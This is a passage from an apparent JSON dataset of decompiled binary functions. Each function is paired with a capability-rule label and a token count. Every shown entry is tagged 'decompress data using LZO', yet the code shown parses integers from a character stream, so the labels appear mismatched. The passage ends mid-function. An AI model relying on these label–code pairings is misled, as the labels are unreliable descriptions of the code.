= 0;\n    *arg_1ch = 4;\ncode_r0x0046f3e2:\n    var_70h = &var_28h;\n    if (var_50h != '\\0') {\n        *arg_1ch = *arg_1ch | 2;\n    }\n    if (stack0xffffffcc != var_70h) {\n        fcn.004c2c30(stack0xffffffcc);\n    }\n    return CONCAT44(arg_ch, arg_8h);\n}\n",
        "token_count": 5882
    },
    "0046fbe0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl\nfcn.0046fbe0(int32_t *arg_8h, uint32_t arg_ch, int32_t *arg_10h, uint arg_14h, int32_t arg_18h, uint32_t *arg_1ch, \n            uint32_t *arg_20h)\n\n{\n    uint8_t uVar1;\n    bool bVar2;\n    bool bVar3;\n    bool bVar4;\n    char cVar5;\n    bool bVar6;\n    int16_t iVar7;\n    int32_t iVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    int16_t *piVar11;\n    int32_t iVar12;\n    uint32_t uVar13;\n    uint32_t uVar14;\n    uint16_t uVar15;\n    uint32_t uVar16;\n    uint8_t uVar17;\n    uint32_t uVar18;\n    bool bVar19;\n    ulong uVar20;\n    uint var_6ch;\n    uint *var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint32_t var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint32_t var_44h;\n    uint32_t var_40h;\n    uint32_t var_3ch;\n    uint *var_31h;\n    uint32_t var_2ch;\n    uint32_t var_28h;\n    uint var_bp_ch;\n    \n    iVar12 = arg_18h;\n    uVar18 = 8;\n    iVar8 = fcn.0044daf0(arg_18h + 0x6c);\n    uVar9 = *(iVar12 + 0xc) & 0x4a;\n    if ((uVar9 != 0x40) && (uVar18 = 0x10,  uVar9 != 8)) {\n        uVar18 = 10;\n    }\n    bVar2 = arg_8h != NULL && arg_ch == -1;\n    bVar19 = arg_ch == -1;\n    if (bVar2) {\n        if (arg_8h[2] < arg_8h[3]) {\n            iVar7 = *arg_8h[2];\n        }\n        else {\n            iVar7 = (**(*arg_8h + 0x24))();\n        }\n        bVar19 = false;\n        if (iVar7 == -1) {\n            arg_8h = NULL;\n            bVar19 = bVar2;\n        }\n    }\n    bVar2 = arg_10h != NULL && arg_14h == -1;\n    bVar3 = arg_14h == -1;\n    if (bVar2) {\n        if (arg_10h[2] < arg_10h[3]) {\n            iVar7 = *arg_10h[2];\n        }\n        else {\n            iVar7 = (**(*arg_10h + 0x24))();\n        }\n        bVar3 = false;\n        if (iVar7 == -1) {\n            arg_10h = NULL;\n            bVar3 = bVar2;\n        }\n    }\n    if (bVar3 == bVar19) {\n        cVar5 = *(iVar8 + 0x10);\n        bVar2 = false;\n        uVar16 = 0;\n        var_48h._2_1_ = 1;\n        var_44h = 0;\n        bVar19 = false;\n    }\n    else {\n        uVar16 = arg_ch & 0xffff;\n        if ((arg_8h != NULL) && (arg_ch == -1)) {\n            if (arg_8h[2] < arg_8h[3]) {\n                uVar16 = *arg_8h[2];\n            }\n            else {\n                uVar16 = (**(*arg_8h + 0x24))();\n            }\n            if (uVar16 == -1) {\n                arg_8h = NULL;\n            }\n        }\n        cVar5 = *(iVar8 + 0x10);\n        iVar7 = uVar16;\n        bVar2 = *(iVar8 + 0x70) == iVar7;\n        if ((bVar2) || (*(iVar8 + 0x72) == iVar7)) {\n            if (((cVar5 == '\\0') || (*(iVar8 + 0x26) != iVar7)) && (*(iVar8 + 0x24) != iVar7)) {\n                if (arg_8h[2] < arg_8h[3]) {\n                    arg_8h[2] = arg_8h[2] + 2;\n                }\n                else {\n                    (**(*arg_8h + 0x28))();\n                }\n                arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                var_48h._2_1_ = fcn.00450410(&arg_10h);\n                if (var_48h._2_1_ != 0) {\n                    cVar5 = *(iVar8 + 0x10);\n                    var_44h = 0;\n                    bVar19 = false;\n                    goto code_r0x0046fdd9;\n                }\n                uVar16 = fcn.00450500();\n                cVar5 = *(iVar8 + 0x10);\n            }\n        }\n        else {\n            bVar2 = false;\n        }\n        var_44h = 0;\n        bVar19 = false;\n        do {\n            iVar7 = uVar16;\n            if ((cVar5 != '\\0') && (*(iVar8 + 0x26) == iVar7)) {\n                var_48h._2_1_ = 0;\n                if (uVar18 != 0x10) goto code_r0x0046fde5;\n                var_28h = var_28h & 0xffffff00;\n                var_50h = 0x16;\n                goto code_r0x00470510;\n            }\n            if (*(iVar8 + 0x24) == iVar7) break;\n            if (*(iVar8 + 0x78) == iVar7) {\n                bVar3 = uVar18 == 10 | bVar19 ^ 1U;\n                if (!bVar3) goto code_r0x0046fd38;\n                bVar19 = uVar9 == 0 || uVar18 == 8;\n                if (uVar9 != 0 && uVar18 != 8) {\n                    var_44h = var_44h + 1;\n                    goto code_r0x0046fd6e;\n                }\n                var_44h = 0;\n                uVar18 = 8;\n                uVar10 = arg_8h[2];\n                if (arg_8h[3] <= uVar10) goto code_r0x00470010;\ncode_r0x0046fd7d:\n                arg_8h[2] = uVar10 + 2;\ncode_r0x0046fd8c:\n                if (arg_8h[2] < arg_8h[3]) {\n                    iVar7 = *arg_8h[2];\n                }\n                else {\n                    iVar7 = (**(*arg_8h + 0x24))();\n                }\n                var_48h._3_1_ = false;\n                if (iVar7 == -1) {\n                    arg_8h = NULL;\n                    var_48h._3_1_ = true;\n                }\n            }\n            else {\n                if (!bVar19) break;\ncode_r0x0046fd38:\n                if ((*(iVar8 + 0x74) != iVar7) && (*(iVar8 + 0x76) != iVar7)) {\n                    var_48h._2_1_ = 0;\n                    bVar19 = true;\n                    goto code_r0x0046fdd9;\n                }\n                var_48h._2_1_ = uVar18 == 0x10 || uVar9 == 0;\n                if (uVar18 != 0x10 && uVar9 != 0) {\n                    bVar19 = true;\n                    goto code_r0x0046fde5;\n                }\n                var_44h = 0;\n                uVar18 = 0x10;\n                bVar3 = false;\ncode_r0x0046fd6e:\n                uVar10 = arg_8h[2];\n                bVar19 = bVar3;\n                if (uVar10 < arg_8h[3]) goto code_r0x0046fd7d;\ncode_r0x00470010:\n                (**(*arg_8h + 0x28))();\n                if (arg_8h != NULL) goto code_r0x0046fd8c;\n                var_48h._3_1_ = true;\n            }\n            arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n            bVar6 = arg_10h != NULL && arg_14h == -1;\n            bVar3 = arg_14h == -1;\n            if (bVar6) {\n                if (arg_10h[2] < arg_10h[3]) {\n                    iVar7 = *arg_10h[2];\n                }\n                else {\n                    iVar7 = (**(*arg_10h + 0x24))();\n                }\n                bVar3 = false;\n                if (iVar7 == -1) {\n                    arg_10h = NULL;\n                    bVar3 = bVar6;\n                }\n            }\n            if (var_48h._3_1_ == bVar3) {\n                cVar5 = *(iVar8 + 0x10);\n                var_48h._2_1_ = 1;\n                goto code_r0x0046fdd9;\n            }\n            uVar16 = 0xffff;\n            if (arg_8h != NULL) {\n                if (arg_8h[2] < arg_8h[3]) {\n                    uVar16 = *arg_8h[2];\n                }\n                else {\n                    uVar16 = (**(*arg_8h + 0x24))();\n                }\n                if (uVar16 == -1) {\n                    arg_8h = NULL;\n                }\n            }\n            cVar5 = *(iVar8 + 0x10);\n        } while (bVar19);\n        var_48h._2_1_ = 0;\n    }\ncode_r0x0046fdd9:\n    var_50h = 0x16;\n    if (uVar18 != 0x10) {\ncode_r0x0046fde5:\n        var_50h = uVar18;\n    }\n    unique0x00001d00 = &var_28h;\n    var_2ch = 0;\n    var_28h = var_28h & 0xffffff00;\n    if (cVar5 != '\\0') {\ncode_r0x00470510:\n        stack0xffffffcc = &var_28h;\n        var_2ch = 0;\n        fcn.004b1bc0(0x20);\n    }\n    uVar17 = var_48h._2_1_;\n    var_68h = &var_28h;\n    uVar20 = fcn.00437f00(0xffffffff, 0xffffffff, uVar18, 0);\n    uVar9 = uVar20 >> 0x20;\n    uVar1 = *(iVar8 + 0xa4);\n    if (uVar1 == 0) {\n        if (var_48h._2_1_ == 0) {\n            var_48h._1_1_ = 0;\n            var_40h = 0;\n            var_3ch = 0;\ncode_r0x0046fe68:\n            uVar15 = uVar16;\n            uVar16 = uVar16 & 0xffff;\n            if (var_50h < 0xb) {\n                if ((uVar15 < 0x30) || (var_50h + 0x30U <= uVar15)) goto code_r0x004700c0;\n            }\n            else if (9 < uVar15 - 0x30) goto code_r0x0047009d;\n            uVar16 = uVar16 - 0x30;\ncode_r0x0046fe8c:\n            if (uVar16 != 0xffffffff) {\n                do {\n                    if (uVar9 < var_3ch || uVar9 - var_3ch < (uVar20 < var_40h)) {\n                        var_48h._1_1_ = 1;\n                        uVar16 = arg_8h[2];\n                        if (arg_8h[3] <= uVar16) goto code_r0x00470163;\ncode_r0x0046fef7:\n                        arg_8h[2] = uVar16 + 2;\ncode_r0x0046ff06:\n                        if (arg_8h[2] < arg_8h[3]) {\n                            iVar7 = *arg_8h[2];\n                        }\n                        else {\n                            iVar7 = (**(*arg_8h + 0x24))();\n                        }\n                        bVar3 = false;\n                        if (iVar7 == -1) {\n                            arg_8h = NULL;\n                            bVar3 = true;\n                        }\n                    }\n                    else {\n                        uVar10 = var_40h * uVar18;\n                        uVar14 = (var_40h * uVar18 >> 0x20) + uVar18 * var_3ch;\n                        uVar13 = ~(uVar16 >> 0x1f);\n                        var_48h._1_1_ = var_48h._1_1_ | (uVar13 < uVar14 || uVar13 - uVar14 < (~uVar16 < uVar10));\n                        var_40h = uVar16 + uVar10;\n                        var_3ch = (uVar16 >> 0x1f) + uVar14 + CARRY4(uVar16, uVar10);\n                        uVar16 = arg_8h[2];\n                        var_44h = var_44h + 1;\n                        if (uVar16 < arg_8h[3]) goto code_r0x0046fef7;\ncode_r0x00470163:\n                        (**(*arg_8h + 0x28))();\n                        if (arg_8h != NULL) goto code_r0x0046ff06;\n                        bVar3 = true;\n                    }\n                    arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                    bVar4 = arg_10h != NULL && arg_14h == -1;\n                    bVar6 = arg_14h == -1;\n                    if (bVar4) {\n                        if (arg_10h[2] < arg_10h[3]) {\n                            iVar7 = *arg_10h[2];\n                        }\n                        else {\n                            iVar7 = (**(*arg_10h + 0x24))();\n                        }\n                        bVar6 = false;\n                        if (iVar7 == -1) {\n                            arg_10h = NULL;\n                            bVar6 = bVar4;\n                        }\n                    }\n                    if (bVar3 == bVar6) {\n                        uVar1 = 1;\n                        goto code_r0x0046ff4c;\n                    }\n                    uVar16 = 0xffff;\n                    if (arg_8h == NULL) goto code_r0x0046fe68;\n                    if (arg_8h[2] < arg_8h[3]) {\n                        uVar16 = *arg_8h[2];\n                    }\n                    else {\n                        uVar16 = (**(*arg_8h + 0x24))();\n                    }\n                    uVar15 = uVar16;\n                    if (uVar15 != 0xffff) goto code_r0x0046fe68;\n                    arg_8h = NULL;\n                    if (var_50h < 0xb) break;\n                    uVar16 = 0xffff;\ncode_r0x0047009d:\n                    if (5 < uVar15 - 0x61) goto code_r0x00470241;\n                    uVar16 = uVar16 - 0x57;\n                    if (uVar16 == 0xffffffff) break;\n                } while( true );\n            }\n            goto code_r0x004700c0;\n        }\n        var_48h._1_1_ = 0;\n        var_48h._2_1_ = 0;\n        var_40h = 0;\n        var_3ch = 0;\n        uVar1 = uVar17;\n    }\n    else {\n        if (var_48h._2_1_ == 0) {\n            var_48h._1_1_ = 0;\n            var_40h = 0;\n            var_3ch = 0;\n            do {\n                uVar10 = var_2ch;\n                iVar7 = uVar16;\n                if ((*(iVar8 + 0x10) == 0) || (*(iVar8 + 0x26) != iVar7)) {\n                    piVar11 = iVar8 + 0x78;\n                    uVar16 = var_50h;\n                    if (iVar7 == *(iVar8 + 0x24)) goto code_r0x004700c0;\n                    while (*piVar11 != iVar7) {\n                        uVar16 = uVar16 - 1;\n                        piVar11 = piVar11 + 1;\n                        if (uVar16 == 0) {\n                            uVar1 = 0;\n                            goto code_r0x0046ff4c;\n                        }\n                    }\n                    iVar12 = piVar11 - (iVar8 + 0x78);\n                    uVar10 = iVar12 >> 1;\n                    uVar16 = uVar10 - 6;\n                    if (iVar12 < 0x1f) {\n                        uVar16 = uVar10;\n                    }\n                    if (var_3ch <= uVar9 && (uVar20 < var_40h) <= uVar9 - var_3ch) {\n                        uVar10 = var_40h * uVar18;\n                        uVar14 = var_3ch * uVar18 + (var_40h * uVar18 >> 0x20);\n                        uVar13 = ~(uVar16 >> 0x1f);\n                        var_48h._1_1_ = var_48h._1_1_ | (uVar13 < uVar14 || uVar13 - uVar14 < (~uVar16 < uVar10));\n                        var_40h = uVar16 + uVar10;\n                        var_3ch = (uVar16 >> 0x1f) + uVar14 + CARRY4(uVar16, uVar10);\n                        var_44h = var_44h + 1;\n                        goto code_r0x004702ed;\n                    }\n                    uVar16 = arg_8h[2];\n                    var_48h._1_1_ = uVar1;\n                    if (arg_8h[3] <= uVar16) goto code_r0x004703c9;\ncode_r0x004702fc:\n                    arg_8h[2] = uVar16 + 2;\ncode_r0x0047030b:\n                    if (arg_8h[2] < arg_8h[3]) {\n                        iVar7 = *arg_8h[2];\n                    }\n                    else {\n                        iVar7 = (**(*arg_8h + 0x24))();\n                    }\n                    uVar17 = 0;\n                    if (iVar7 == -1) {\n                        arg_8h = NULL;\n                        uVar17 = uVar1;\n                    }\n                }\n                else {\n                    if (var_44h == 0) {\n                        var_48h._2_1_ = *(iVar8 + 0x10);\n                        uVar1 = 0;\n                        goto code_r0x0046ff4c;\n                    }\n                    uVar16 = var_2ch + 1;\n                    uVar13 = 0xf;\n                    if (stack0xffffffcc != var_68h) {\n                        uVar13 = var_28h;\n                    }\n                    if (uVar13 < uVar16) {\n                        fcn.004b1f10(var_2ch, 0, 0, 1);\n                    }\n                    var_44h = 0;\n                    *(stack0xffffffcc + uVar10) = var_44h;\n                    *(stack0xffffffcc + uVar16) = 0;\n                    var_2ch = uVar16;\ncode_r0x004702ed:\n                    uVar16 = arg_8h[2];\n                    if (uVar16 < arg_8h[3]) goto code_r0x004702fc;\ncode_r0x004703c9:\n                    (**(*arg_8h + 0x28))();\n                    uVar17 = uVar1;\n                    if (arg_8h != NULL) goto code_r0x0047030b;\n                }\n                arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                bVar6 = arg_10h != NULL && arg_14h == -1;\n                bVar3 = arg_14h == -1;\n                if (bVar6) {\n                    if (arg_10h[2] < arg_10h[3]) {\n                        iVar7 = *arg_10h[2];\n                    }\n                    else {\n                        iVar7 = (**(*arg_10h + 0x24))();\n                    }\n                    bVar3 = false;\n                    if (iVar7 == -1) {\n                        arg_10h = NULL;\n                        bVar3 = bVar6;\n                    }\n                }\n                if (bVar3 == uVar17) goto code_r0x0046ff4c;\n                uVar16 = 0xffff;\n                if (arg_8h != NULL) {\n                    if (arg_8h[2] < arg_8h[3]) {\n                        uVar16 = *arg_8h[2];\n                    }\n                    else {\n                        uVar16 = (**(*arg_8h + 0x24))();\n                    }\n                    if (uVar16 == -1) {\n                        arg_8h = NULL;\n                    }\n                }\n            } while( true );\n        }\n        var_48h._1_1_ = 0;\n        var_40h = 0;\n        var_3ch = 0;\n        var_48h._2_1_ = 0;\n        uVar1 = uVar17;\n    }\ncode_r0x0046ff4c:\n    if (var_2ch != 0) goto code_r0x004700cf;\ncode_r0x0046ff54:\n    if ((var_44h != 0) || (bVar19)) {\ncode_r0x00470113:\n        if (var_48h._2_1_ == 0) {\n            if (var_48h._1_1_ == 0) {\n                if (bVar2) {\n                    bVar19 = var_40h != 0;\n                    var_40h = -var_40h;\n                    var_3ch = -(var_3ch + bVar19);\n                }\n                *arg_20h = var_40h;\n                arg_20h[1] = var_3ch;\n            }\n            else {\n                *arg_20h = 0xffffffff;\n                arg_20h[1] = 0xffffffff;\n                *arg_1ch = 4;\n            }\n            goto code_r0x0046ff82;\n        }\n    }\ncode_r0x0046ff69:\n    *arg_20h = 0;\n    arg_20h[1] = 0;\n    *arg_1ch = 4;\ncode_r0x0046ff82:\n    if (uVar1 != 0) {\n        *arg_1ch = *arg_1ch | 2;\n    }\n    if (stack0xffffffcc != var_68h) {\n        fcn.004c2c30(stack0xffffffcc);\n    }\n    return CONCAT44(arg_ch, arg_8h);\ncode_r0x00470241:\n    if (5 < uVar15 - 0x41) goto code_r0x004700c0;\n    uVar16 = uVar16 - 0x37;\n    goto code_r0x0046fe8c;\ncode_r0x004700c0:\n    uVar1 = 0;\n    if (var_2ch == 0) goto code_r0x0046ff54;\ncode_r0x004700cf:\n    fcn.004b20a0(var_44h);\n    cVar5 = fcn.004bdf20(*(iVar8 + 8), *(iVar8 + 0xc), &var_31h + 1);\n    if (cVar5 == '\\0') {\n        *arg_1ch = 4;\n    }\n    if ((bVar19) || ((var_44h | var_2ch) != 0)) goto code_r0x00470113;\n    goto code_r0x0046ff69;\n}\n",
        "token_count": 5582
    },
    "00470770": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl\nfcn.00470770(int32_t *arg_8h, uint arg_ch, int32_t *arg_10h, uint arg_14h, int32_t arg_18h, uint32_t *arg_1ch, \n            uint32_t *arg_20h)\n\n{\n    uint8_t uVar1;\n    bool bVar2;\n    char cVar3;\n    bool bVar4;\n    char cVar5;\n    uint16_t uVar6;\n    int16_t iVar7;\n    int32_t iVar8;\n    uint32_t uVar9;\n    uint16_t *puVar10;\n    int32_t iVar11;\n    bool bVar12;\n    uint32_t uVar13;\n    uint32_t uVar14;\n    uint32_t uVar15;\n    bool bVar16;\n    uint var_4ch;\n    uint var_48h;\n    uint32_t var_44h;\n    uint *var_40h;\n    uint32_t var_3ch;\n    uint8_t var_36h;\n    int32_t var_35h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_1eh;\n    uint var_ch;\n    \n    iVar11 = arg_18h;\n    iVar8 = fcn.0044daf0(arg_18h + 0x6c);\n    uVar14 = *(iVar11 + 0xc) & 0x4a;\n    if (uVar14 == 0x40) {\n        uVar15 = 8;\ncode_r0x004707af:\n        var_35h._0_1_ = fcn.00450410(&arg_10h);\n        if (var_35h == '\\0') {\ncode_r0x004707ce:\n            var_40h = &arg_10h;\n            uVar6 = fcn.004504b0();\n            bVar16 = *(iVar8 + 0x70) == uVar6;\n            cVar3 = *(iVar8 + 0x10);\n            if ((((bVar16) || (*(iVar8 + 0x72) == uVar6)) && ((cVar3 == '\\0' || (*(iVar8 + 0x26) != uVar6)))) &&\n               (*(iVar8 + 0x24) != uVar6)) {\n                fcn.004a5ed0();\n                arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                var_35h._0_1_ = fcn.00450410(var_40h);\n                stack0xffffffc8 = 0;\n                bVar2 = false;\n                if (var_35h == '\\0') {\n                    uVar6 = fcn.004504b0();\n                    cVar3 = *(iVar8 + 0x10);\n                    goto code_r0x00470a18;\n                }\n            }\n            else {\ncode_r0x00470a18:\n                stack0xffffffc8 = 0;\n                bVar2 = false;\n                while (((cVar3 == '\\0' || (*(iVar8 + 0x26) != uVar6)) && (*(iVar8 + 0x24) != uVar6))) {\n                    if (*(iVar8 + 0x78) == uVar6) {\n                        bVar4 = uVar15 == 10 | bVar2 ^ 1U;\n                        if (!bVar4) goto code_r0x00470a4f;\n                        bVar2 = uVar14 == 0 || uVar15 == 8;\n                        if (uVar14 != 0 && uVar15 != 8) {\n                            unique0x00007a80 = stack0xffffffc8 + 1;\n                            goto code_r0x00470a85;\n                        }\n                        stack0xffffffc8 = 0;\n                        uVar15 = 8;\n                        uVar9 = arg_8h[2];\n                        if (arg_8h[3] <= uVar9) goto code_r0x00470b40;\ncode_r0x00470a94:\n                        arg_8h[2] = uVar9 + 2;\ncode_r0x00470aa3:\n                        if (arg_8h[2] < arg_8h[3]) {\n                            iVar7 = *arg_8h[2];\n                        }\n                        else {\n                            iVar7 = (**(*arg_8h + 0x24))();\n                        }\n                        var_35h._0_1_ = false;\n                        if (iVar7 == -1) {\n                            arg_8h = NULL;\n                            var_35h._0_1_ = true;\n                        }\n                    }\n                    else {\n                        if (!bVar2) break;\ncode_r0x00470a4f:\n                        if ((*(iVar8 + 0x74) != uVar6) && (*(iVar8 + 0x76) != uVar6)) {\n                            var_35h._0_1_ = '\\0';\n                            bVar2 = true;\n                            goto code_r0x00470850;\n                        }\n                        var_35h._0_1_ = uVar15 == 0x10 || uVar14 == 0;\n                        if (uVar15 != 0x10 && uVar14 != 0) {\n                            bVar2 = true;\n                            goto code_r0x0047085c;\n                        }\n                        stack0xffffffc8 = 0;\n                        uVar15 = 0x10;\n                        bVar4 = false;\ncode_r0x00470a85:\n                        uVar9 = arg_8h[2];\n                        bVar2 = bVar4;\n                        if (uVar9 < arg_8h[3]) goto code_r0x00470a94;\ncode_r0x00470b40:\n                        (**(*arg_8h + 0x28))();\n                        if (arg_8h != NULL) goto code_r0x00470aa3;\n                        var_35h._0_1_ = true;\n                    }\n                    arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                    bVar12 = arg_10h != NULL && arg_14h == -1;\n                    bVar4 = arg_14h == -1;\n                    if (bVar12) {\n                        if (arg_10h[2] < arg_10h[3]) {\n                            iVar7 = *arg_10h[2];\n                        }\n                        else {\n                            iVar7 = (**(*arg_10h + 0x24))();\n                        }\n                        bVar4 = false;\n                        if (iVar7 == -1) {\n                            arg_10h = NULL;\n                            bVar4 = bVar12;\n                        }\n                    }\n                    if (var_35h == bVar4) {\n                        var_35h._0_1_ = '\\x01';\n                        goto code_r0x00470850;\n                    }\n                    uVar6 = 0xffff;\n                    if (arg_8h != NULL) {\n                        if (arg_8h[2] < arg_8h[3]) {\n                            uVar6 = *arg_8h[2];\n                        }\n                        else {\n                            uVar6 = (**(*arg_8h + 0x24))();\n                        }\n                        if (uVar6 == 0xffff) {\n                            arg_8h = NULL;\n                        }\n                    }\n                    if (!bVar2) break;\n                    cVar3 = *(iVar8 + 0x10);\n                }\n                var_35h._0_1_ = '\\0';\n            }\ncode_r0x00470850:\n            var_44h = 0x16;\n            if (uVar15 == 0x10) goto code_r0x0047085f;\n        }\n        else {\n            uVar6 = 0;\n            stack0xffffffc8 = 0;\n            bVar2 = false;\n            bVar16 = false;\n        }\ncode_r0x0047085c:\n        var_44h = uVar15;\n    }\n    else {\n        if (uVar14 != 8) {\n            uVar15 = 10;\n            goto code_r0x004707af;\n        }\n        uVar15 = 0x10;\n        var_35h._0_1_ = fcn.00450410(&arg_10h);\n        if (var_35h == '\\0') goto code_r0x004707ce;\n        uVar6 = 0;\n        stack0xffffffc8 = 0;\n        uVar15 = 0x10;\n        bVar2 = false;\n        bVar16 = false;\n        var_44h = 0x16;\n    }\ncode_r0x0047085f:\n    cVar3 = var_35h;\n    var_40h = &arg_10h;\n    *NULL = fcn.0048b140(0, 0, &var_1eh + 1);\n    if (*(iVar8 + 0x10) != '\\0') {\n        fcn.0048c930(0x20);\n    }\n    uVar14 = 0xffffffff / uVar15;\n    uVar1 = *(iVar8 + 0xa4);\n    if (uVar1 == 0) {\n        var_36h = 0;\n        if (var_35h == '\\0') {\n            var_3ch = 0;\n            do {\n                uVar9 = uVar6;\n                if (var_44h < 0xb) {\n                    if ((uVar6 < 0x30) || (var_44h + 0x30U <= uVar6)) goto code_r0x00470bf0;\ncode_r0x004708e6:\n                    uVar9 = uVar9 - 0x30;\n                }\n                else {\n                    if (uVar6 - 0x30 < 10) goto code_r0x004708e6;\n                    if (uVar6 - 0x61 < 6) {\n                        uVar9 = uVar9 - 0x57;\n                    }\n                    else {\n                        if (5 < uVar6 - 0x41) goto code_r0x00470bf0;\n                        uVar9 = uVar9 - 0x37;\n                    }\n                }\n                if (uVar9 == 0xffffffff) goto code_r0x00470bf0;\n                if (uVar14 < var_3ch) {\n                    var_36h = 1;\n                    uVar9 = arg_8h[2];\n                    if (arg_8h[3] <= uVar9) goto code_r0x00470c93;\ncode_r0x00470925:\n                    arg_8h[2] = uVar9 + 2;\n                }\n                else {\n                    var_36h = var_36h | ~uVar9 < var_3ch * uVar15;\n                    var_3ch = uVar9 + var_3ch * uVar15;\n                    unique0x00007a80 = stack0xffffffc8 + 1;\n                    uVar9 = arg_8h[2];\n                    if (uVar9 < arg_8h[3]) goto code_r0x00470925;\ncode_r0x00470c93:\n                    (**(*arg_8h + 0x28))();\n                }\n                arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                cVar3 = fcn.00450410(var_40h);\n                if (cVar3 != '\\0') goto code_r0x0047094f;\n                uVar6 = fcn.004504b0();\n            } while( true );\n        }\n        var_3ch = 0;\n        var_35h._0_1_ = '\\0';\n    }\n    else if (var_35h == '\\0') {\n        var_36h = 0;\n        cVar5 = *(iVar8 + 0x10);\n        var_3ch = 0;\n        if (cVar5 == '\\0') goto code_r0x00470dc0;\ncode_r0x00470d48:\n        if (*(iVar8 + 0x26) != uVar6) goto code_r0x00470dc0;\n        if (stack0xffffffc8 != 0) {\n            fcn.0048cc10(stack0xffffffc8);\n            stack0xffffffc8 = 0;\ncode_r0x00470d71:\n            uVar9 = arg_8h[2];\n            if (arg_8h[3] <= uVar9) goto code_r0x00470e23;\n            do {\n                arg_8h[2] = uVar9 + 2;\n                while( true ) {\n                    arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                    cVar3 = fcn.00450410(var_40h);\n                    if (cVar3 != '\\0') goto code_r0x0047094f;\n                    uVar6 = fcn.004504b0();\n                    cVar5 = *(iVar8 + 0x10);\n                    if (cVar5 != '\\0') goto code_r0x00470d48;\ncode_r0x00470dc0:\n                    puVar10 = iVar8 + 0x78;\n                    uVar9 = var_44h;\n                    if (uVar6 == *(iVar8 + 0x24)) goto code_r0x00470bf0;\n                    while (*puVar10 != uVar6) {\n                        uVar9 = uVar9 - 1;\n                        puVar10 = puVar10 + 1;\n                        if (uVar9 == 0) {\n                            cVar3 = '\\0';\n                            goto code_r0x0047094f;\n                        }\n                    }\n                    iVar11 = puVar10 - (iVar8 + 0x78);\n                    uVar9 = iVar11 >> 1;\n                    if (0x1e < iVar11) {\n                        uVar9 = uVar9 - 6;\n                    }\n                    if (var_3ch <= uVar14) {\n                        uVar13 = var_3ch * uVar15;\n                        var_3ch = uVar9 + uVar13;\n                        var_36h = var_36h | ~uVar9 < uVar13;\n                        unique0x00007a80 = stack0xffffffc8 + 1;\n                        goto code_r0x00470d71;\n                    }\n                    uVar9 = arg_8h[2];\n                    var_36h = uVar1;\n                    if (uVar9 < arg_8h[3]) break;\ncode_r0x00470e23:\n                    (**(*arg_8h + 0x28))();\n                }\n            } while( true );\n        }\n        cVar3 = '\\0';\n        var_35h._0_1_ = cVar5;\n    }\n    else {\n        var_3ch = 0;\n        var_36h = 0;\n        var_35h._0_1_ = '\\0';\n    }\ncode_r0x0047094f:\n    cVar5 = cVar3;\n    if (*(stack0xffffffe0 + -0xc) != 0) goto code_r0x00470c00;\ncode_r0x0047095d:\n    if ((stack0xffffffc8 != 0) || (bVar2)) {\ncode_r0x00470c4d:\n        if (var_35h == '\\0') {\n            if (var_36h == 0) {\n                uVar14 = -var_3ch;\n                if (!bVar16) {\n                    uVar14 = var_3ch;\n                }\n                *arg_20h = uVar14;\n            }\n            else {\n                *arg_20h = 0xffffffff;\n                *arg_1ch = 4;\n            }\n            goto code_r0x00470984;\n        }\n    }\n    goto code_r0x00470972;\ncode_r0x00470bf0:\n    cVar3 = '\\0';\n    cVar5 = '\\0';\n    if (*(stack0xffffffe0 + -0xc) == 0) goto code_r0x0047095d;\ncode_r0x00470c00:\n    cVar3 = cVar5;\n    fcn.0048cc10(var_35h._1_1_);\n    cVar5 = fcn.004bdf60(*(iVar8 + 8), *(iVar8 + 0xc), &var_1eh + 2);\n    if (cVar5 == '\\0') {\n        *arg_1ch = 4;\n    }\n    if (((stack0xffffffc8 != 0) || (bVar2)) || (*(stack0xffffffe0 + -0xc) != 0)) goto code_r0x00470c4d;\ncode_r0x00470972:\n    *arg_20h = 0;\n    *arg_1ch = 4;\ncode_r0x00470984:\n    if (cVar3 != '\\0') {\n        *arg_1ch = *arg_1ch | 2;\n    }\n    fcn.0048b630(&var_1eh + 1);\n    return CONCAT44(arg_ch, arg_8h);\n}\n",
        "token_count": 3793
    },
    "00470f70": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl\nfcn.00470f70(int32_t *arg_8h, uint arg_ch, int32_t *arg_10h, uint arg_14h, int32_t arg_18h, uint32_t *arg_1ch, \n            uint32_t *arg_20h)\n\n{\n    bool bVar1;\n    uint8_t uVar2;\n    bool bVar3;\n    char cVar4;\n    uint8_t uVar5;\n    uint16_t uVar6;\n    int16_t iVar7;\n    int32_t iVar8;\n    uint32_t uVar9;\n    int32_t iVar10;\n    uint32_t uVar11;\n    uint16_t *puVar12;\n    int32_t iVar13;\n    bool bVar14;\n    bool bVar15;\n    uint32_t var_5ch;\n    int32_t var_58h;\n    uint var_54h;\n    uint32_t var_50h;\n    uint32_t var_4ch;\n    uint var_48h;\n    uint32_t var_44h;\n    uint *var_40h;\n    uint32_t var_3ch;\n    uint8_t var_36h;\n    int32_t var_35h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_1eh;\n    uint var_ch;\n    \n    iVar10 = arg_18h;\n    iVar8 = fcn.0044daf0(arg_18h + 0x6c);\n    uVar9 = *(iVar10 + 0xc) & 0x4a;\n    if (uVar9 == 0x40) {\n        var_5ch = 8;\ncode_r0x00470faf:\n        var_35h._0_1_ = 